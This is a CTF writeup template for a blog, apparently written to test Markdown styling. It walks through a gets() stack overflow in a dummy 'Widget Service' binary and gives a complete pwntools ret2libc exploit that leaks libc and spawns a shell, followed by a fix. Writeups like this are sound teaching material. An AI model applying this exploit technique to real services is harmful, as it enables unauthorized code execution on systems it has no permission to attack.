---
layout: ../../layouts/BlogLayout.astro
title: "Sample CTF Writeup"
date: 2026-03-09
event: "Example CTF 2026"
category: "pwn"
difficulty: "medium"
author: "Your Name / Team"
tags:
  - ctf
  - pwn
  - exploitation
  - writeup
draft: false
description: "A full template demonstrating typical sections used in technical CTF writeups."
---

# Exploiting the Widget Service

> This is a **dummy template** intended to test markdown → HTML styling for a CTF blog. <br />
> It intentionally includes **many markdown constructs** so you can style them in Astro. <br />

---

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [Provided Files](#provided-files)
- [Initial Recon](#initial-recon)
- [Static Analysis](#static-analysis)
- [Dynamic Analysis](#dynamic-analysis)
- [Vulnerability Discovery](#vulnerability-discovery)
- [Exploit Development](#exploit-development)
- [Final Exploit Script](#final-exploit-script)
- [Flag](#flag)
- [Lessons Learned](#lessons-learned)

---

# Challenge Overview

| Field | Value |
|------|------|
| Challenge | Widget Service |
| Category | Pwn |
| Points | 300 |
| Difficulty | Medium |
| Author | challenge_author |

### Description

> Our company built a new **Widget API** <br />
> Unfortunately, users keep stealing flags from it <br />
> Can you figure out how?

```
nc challenge.ctf.example 31337
```

---

# Provided Files

Typical files included in the challenge:

```
.
├── chall
├── chall.c
├── Dockerfile
├── libc.so.6
└── ld-linux-x86-64.so.2
```

Download:

- `chall`
- `chall.c`
- `libc.so.6`

---

# Initial Recon

First, let's inspect the binary.

```bash
file chall
```

Output:

```
chall: ELF 64-bit LSB executable, x86-64, dynamically linked
```

Check protections:

```bash
checksec --file=chall
```

Example output:

```
RELRO           PARTIAL
Stack Canary    No
NX              Enabled
PIE             Disabled
```

---

# Static Analysis

Opening the binary in **Ghidra** or **IDA** reveals the following function:

```c
void vuln() {
    char buf[64];
    puts("Enter input:");
    gets(buf);
}
```

Observations:

- `gets()` is used
- buffer size = **64**
- classic **buffer overflow**

### Call Graph

```
main
 └── vuln
      └── gets
```

---

# Dynamic Analysis

Let's run the program.

```bash
./chall
```

Example interaction:

```
Enter input:
hello
```

Testing overflow:

```bash
python3 -c "print('A'*200)" | ./chall
```

Result:

```
Segmentation fault
```

Now let's generate a **cyclic pattern**.

```python
from pwn import *

pattern = cyclic(200)
print(pattern)
```

After crashing the binary, we check the offset.

```bash
cyclic -l 0x6161616c
```

Output:

```
72
```

So the **return address offset = 72 bytes**.

---

# Vulnerability Discovery

The overflow allows us to overwrite the **return address**.

Stack layout:

```
[ buffer (64 bytes) ]
[ saved RBP (8 bytes) ]
[ return address ]
```

Total offset:

```
64 + 8 = 72 bytes
```

Therefore:

```python
payload = b"A" * 72 + b"BBBBBBBB"
```

---

# Exploit Strategy

Possible approaches:

1. **ret2win**
2. **ret2libc**
3. **ROP chain**

Since NX is enabled but PIE is disabled, **ret2libc** is easiest.

Steps:

1. Leak libc address
2. Calculate base
3. Call `system("/bin/sh")`

---

# ROP Gadgets

Using `ROPgadget`:

```bash
ROPgadget --binary chall | grep "pop rdi"
```

Example gadget:

```
0x40123b : pop rdi ; ret
```

---

# Exploit Development

Example pwntools skeleton:

```python
from pwn import *

context.binary = './chall'
elf = ELF('./chall')
libc = ELF('./libc.so.6')

p = process('./chall')

offset = 72
pop_rdi = 0x40123b

payload = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["main"]
)

p.sendline(payload)
p.interactive()
```

---

# Final Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './chall'
elf = ELF('./chall')
libc = ELF('./libc.so.6')

def start():
    if args.REMOTE:
        return remote("challenge.ctf.example", 31337)
    return process(elf.path)

p = start()

offset = 72
pop_rdi = 0x40123b

payload = flat(
    b"A"*offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)

p.sendlineafter("input:", payload)

leak = u64(p.recvline().strip().ljust(8,b"\x00"))
log.success(f"puts leak: {hex(leak)}")

libc.address = leak - libc.symbols['puts']
log.success(f"libc base: {hex(libc.address)}")

payload = flat(
    b"A"*offset,
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    libc.symbols['system']
)

p.sendline(payload)
p.interactive()
```

---

# Remote Exploit Example

```bash
python3 exploit.py REMOTE=1
```

---

# Screenshots Section

Example markdown image:

```markdown
![gdb crash screenshot](/images/writeups/example-crash.png)
```

Rendered:

![Logo](/assets/logo/logo.webp)

---

# Inline Code Examples

You can highlight inline commands like `checksec`, `gdb`, or `pwntools`.

Example:

Run `gdb ./chall` and set a breakpoint at `vuln`.

---

# Blockquotes / Notes

> ⚠️ **Note:** Always verify libc versions when exploiting remotely.

> 💡 **Tip:** `pwntools` dramatically speeds up exploit development.

---

# Lists

### Bullet List

- buffer overflow
- format string
- use-after-free
- integer overflow

### Numbered List

1. reverse the binary
2. find vulnerability
3. build exploit
4. capture flag

---

# Collapsible Details (HTML inside Markdown)

<details>
<summary>Click to expand debugging notes</summary>

```
gef➤  info registers
RIP: 0x4141414141414141
```

</details>

---

# Flag

```
flag{example_ctf_dummy_flag}
```

---

# Lessons Learned

- Never use `gets()`
- Always enable **stack canaries**
- Enable **PIE + ASLR**

---

# References

- https://docs.pwntools.com/
- https://ropemporium.com/
- https://ctf101.org/

---

# Appendix

## Example JSON

```json
{
  "challenge": "widget",
  "category": "pwn",
  "points": 300,
  "solved": true
}
```

## Example YAML

```yaml
name: widget
category: pwn
difficulty: medium
points: 300
```

## Example Diff

```diff
- gets(buf);
+ fgets(buf, sizeof(buf), stdin);
```

---

# End of Template
